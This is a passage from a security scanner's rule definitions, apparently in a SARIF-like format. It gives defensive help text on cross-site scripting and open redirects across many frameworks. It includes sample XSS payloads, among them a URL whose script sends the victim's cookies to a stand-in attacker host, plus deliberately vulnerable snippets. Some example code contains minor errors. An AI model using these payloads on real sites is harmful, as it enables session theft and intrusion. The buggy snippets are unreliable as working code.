any\ndynamic content possibly coming from an untrusted source. In Python, the builtin html module provides the escape() function for this purpose:\n\npython\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\njsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n\n\nTo disable auto-escaping in React, you would use the property dangerouslySetInnerHTML. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\njsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\nhtml\n<p>\n  @(article.content)\n</p>\n\n\nYou can opt out of this protection by using @Html(). Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\nhtml\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the play.api.templates.HtmlFormat.escape() method for this. Other options are the\norg.apache.commons.lang.StringEscapeUtils.escapeHtml() method from the Apache\ncommons-lang library or the org.springframework.web.util.HtmlUtils class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\nphp\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: <script>alert('XSS!');</script>\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in htmlspecialchars function:\n\nphp\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n\n\nBy using htmlspecialchars, the input string is made safe for displaying in HTML by converting characters like < and > into their respective HTML entities (&lt; and &gt;), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use htmlspecialchars or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against <script> tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html).",
                "markdown": "Attacker controlled sensitive data is not escaped and inserted into a database in this flow. This indicates a potential stored cross-site scripting (XSS) attack.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)."
              },
              "name": "Cross-siteScripting",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "Attacker controlled sensitive data is not escaped and inserted into a database in this flow. This indicates a potential stored cross-site scripting (XSS) attack."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Cross-Site Scripting"
              }
            },
            {
              "id": "open-redirect",
              "help": {
                "text": "Attacker-controlled data is not escaped and used in a HTTP redirect. This indicates an open redirect vulnerability. It may also allow for response splitting, session fixation or cross-site scripting attacks.\n\n# Open Redirects\n\nAn *HTTP redirect* is when a web-server returns an HTTP status code like 302 to tell the browser to make a request to a\ndifferent URL. Redirects can also be performed in client-side JavaScript code by updating the browser URL directly.\n\nRedirects are commonly used to push a user to an authentication page before viewing some protected content. In this \nscenario, the user will often be redirected again back to the original resource once they have successfully logged in. \n\nIf a redirect URL is pulled from a preceding HTTP request, you need to check the URL is safe before redirecting the\nuser. Typically, this means checking the URL is a **relative URL** to a resource hosted under your web domain. **Open \nredirects** - which allow a maliciously crafted link to redirect the user to arbitrary third-party domains - are often \nused by spammers to disguise harmful links in emails.\n\n::::tabs\n\n:::tab[Java]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Java application verifies the \nredirect URL:\n\njava\n@Override\npublic void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    String username = request.getParameter(\"username\");\n    String password = request.getParameter(\"password\");\n\n    if (!this.credentialsAreValid(username, password)) {\n        request.setAttribute(\"message\", \"Incorrect credentials\");\n        response.sendRedirect(\"/login\");\n        return;\n    }\n\n    HttpSession session = request.getSession(true);\n    session.setAttribute(\"username\", username);\n\n    String destination = request.getParameter(\"destination\");\n\n    if (destination == null || !this.isRelative(destination)) {\n        destination = \"/home\";\n    }\n\n    response.sendRedirect(destination);\n}\n\n/**\n * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\\\".\n */\nprivate boolean isRelative(String url) {\n    return url.matches(\"/[^/\\\\]?.*\");\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Angular]\n\n## Disallowing Offsite Redirects\n\nClient-side frameworks like Angular often mimic server-side redirects by using typescript logic. There are a number of \nways of doing redirects in Angular code - updating the window.location directly, using the browser's history API, or \nusing the Router module:\n\ntypescript\n/**\n * An example of how to push the user to the login page if they attempt to access a sensitive\n * route before authenticating thmeselves.\n */\nexport class AuthGuard implements CanActivate {\n  constructor(private authService: AuthService, private router: Router) {}\n\n  canActivate(next: ActivatedRouteSnapshot, state: RouterStateSnapshot): Observable<true | UrlTree> {\n    \n    // Check whether the user is logged in.  \n    return this.authService.isLoggedIn().pipe(\n      map(isLoggedIn => {\n        if (!isLoggedIn) {\n            \n          // Redirect the user to the login page if they are not logged in.  \n          return this.router.parseUrl(/login?destination=${state.url});\n        }\n\n        return true\n      })\n    )\n  }\n}\n\n\nWhen performing a redirect, it is important to check that the URL you are redirecting to is a relative URL - that is, it \nstarts with a single / character:\n\ntypescript\nexport class LoginComponent {\n\n  // The username and password entered by the user in the login form.\n  username = '';\n  password = '';\n\n  // The destination URL to redirect the user to once they log in successfully.\n  destinationURL = '/feed'\n\n  constructor(private authService : AuthService,\n              private route       : ActivatedRoute,\n              private router      : Router) { }\n\n  ngOnInit() {\n    this.destinationURL = this.route.snapshot.queryParams['destination'] || '/feed';\n  }\n\n  onSubmit() {\n    this.authService.login(this.username, this.password)\n      .subscribe(\n        () => {\n          // After the user has lgged in, redirect them to their desired destination.\n          let url = this.destinationURL\n\n          // Confirm that the URL is a relative path - i.e. starting with a single '/' characters.\n          if (!url.match(/^\\/[^\\/\\\\]/)) {\n            url = '/feed'\n          }\n\n          this.router.navigate([ url ])\n        })\n  }\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[C#]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this ASP.NET login action verifies the \nredirect URL:\n\ncsharp\n[HttpPost]\n[AllowAnonymous]\n[ValidateAntiForgeryToken]\npublic async Task<ActionResult> Login(string username, string password, [FromQuery] string returnUrl)\n{\n    var result = await SignInManager.PasswordSignInAsync(username, password, true, false);\n\n    if (result.Succeeded)\n    {\n        // Make sure this a URL within our website.\n        if (Url.IsLocalUrl(returnUrl))\n        {\n            return Redirect(returnUrl);\n        }\n        \n        return RedirectToAction(\"Home\");\n    }\n    \n    return View();\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they will be \nrejected too.) \n\n:::\n\n:::tab[JavaScript]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Express application verifies the \nredirect URL:\n\njavascript\nconst app = express()\n\napp.use(express.urlencoded())\napp.use(cookieParser('secret'))\napp.use(session({ cookie: { maxAge: 60000 }}))\napp.use(flash())\n\napp.post('/login', (request, response) => {\n  const username = request.body.username\n  const password = request.body.password\n\n  if (!usernameAndPasswordAreValid(username, password)) {\n    request.flash('message', 'Incorrect credentials')\n    response.redirect('/login')\n\n    return\n  }\n\n  // Log the user in.\n  request.session.user = username\n\n  // Check redirect URL is a relative path - otherwise just send the user to /home page.\n  const redirectURL = request.query.redirect\n\n  // Check the URL starts with a single / character.\n  if (redirectURL && redirectURL.match(/^\\/[^\\/\\\\]/)) {\n    response.redirect(redirectURL)\n  }\n  else {\n    response.redirect('/home')\n  }\n})\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Python]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Python application verifies the \nredirect URL:\n\npython\n@app.route('/login', methods=['POST'])\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  user = find_user_with_password(username, password)\n\n  if not user:\n    flash('Invalid credentials', 'error')\n    return redirect('/login')\n\n  session['username'] = username\n\n  destination = request.args.get('destination')\n\n  if destination is None or not is_relative(destination):\n    destination = '/timeline'\n\n  return redirect(destination)\n\ndef is_relative(url):\n  return re.match(r\"^\\/[^\\/\\\\]\", url)\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[React]\n\n## Disallowing Offsite Redirects\n\nThere are a number of ways of doing redirects in React code - updating the window.location directly, using the \nbrowser's history API, or using the <Redirect> component from the react-router module. Whichever method you use, it \nis important to check that the URL you are redirecting to is a relative URL - that is, it starts with a single / \ncharacter:\n\njsx\n/**\n * A wrapper for <Route> that redirects to /feed if the user is authenticated.\n */\nfunction UnauthenticatedRoute(props) {\n  if (!props.loggedIn) {\n    return <Route {...props} />\n  }\n\n  // If the user has just authenticated, check the query string for their intended destination.\n  const parsed = queryString.parse(props.location.search)\n\n  let url = '/feed'\n\n  // Ensure this is a relative URL within the site (i.e. it starts with a single / character.)\n  if (parsed.destination && parsed.destination.match(/^\\/[^\\/\\\\]/)) {\n    url = parsed.destination\n  }\n\n  return <Redirect to={{ pathname: url }} />\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Scala]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Scala application verifies the \nredirect URL:\n\nscala\nclass LoginController @Inject()(cc: ControllerComponents, users: UserRepository) extends AbstractController(cc) {\n\n  /**\n   * Process the response from the login page, safely checking for a redirect parameter.\n   */\n  def login = Action(parse.form(loginForm)) { request =>\n    val credentials = request.body\n\n    if (!users.credentialsAreValid(credentials.username, credentials.password)) {\n      Redirect(\"/login\").flashing(\"error\" -> \"Incorrect username or password.\")\n    }\n    else {\n      var next = request.getQueryString(\"destination\").getOrElse(\"/home\")\n\n      if (!isRelative(next)) {\n        next = \"/home\"\n      }\n\n      Redirect(next).withSession(request.session + (\"username\" -> credentials.username))\n    }\n  }\n\n  /**\n   * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\".\n   */\n  def isRelative(url : String) =  {\n    url.matches(\"/[^/\\\\]?.*\");\n  }\n\n  case class Credentials(username: String, password: String)\n\n  def loginForm = Form(\n    mapping(\n      \"username\" -> text,\n      \"password\" -> text\n    )(Credentials.apply)(Credentials.unapply)\n  )\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Go]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single / character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Go application verifies the \nredirect URL:\n\ngo\nfunc LoginHandler(response http.ResponseWriter, request *http.Request) {\n  request.ParseForm()\n\n  session, _ := session.Get(request, \"session\")\n\n  username := request.Form.Get(\"username\")\n  password := request.Form.Get(\"password\")\n\n  user := findUserWithPassword(username, password)\n\n  if user == nil {\n    http.Redirect(response, request, \"/login\", http.StatusUnauthorized)\n    return\n  }\n\n  session.Values[\"username\"] = username\n  session.Save(request, response)\n\n  destination := request.URL.Query().Get(\"destination\")\n\n  // Protect against redirect attacks by checking the destination URL starts with a single / character.\n  if destination == \"\" {\n    destination = \"/home\"\n  } else {\n    isRelative, _ := regexp.MatchString(\"^/[^/]\", destination)\n\n    if !isRelative {\n      destination = \"/home\"\n    }\n  }\n\n  http.Redirect(response, request, destination, http.StatusOK)\n}\n\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single / character. (Note that\nURLs starting with // will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[PHP]\n\n## Disallowing Offsite Redirects in PHP\n\nOpen redirects in PHP are commonly introduced when user input is improperly 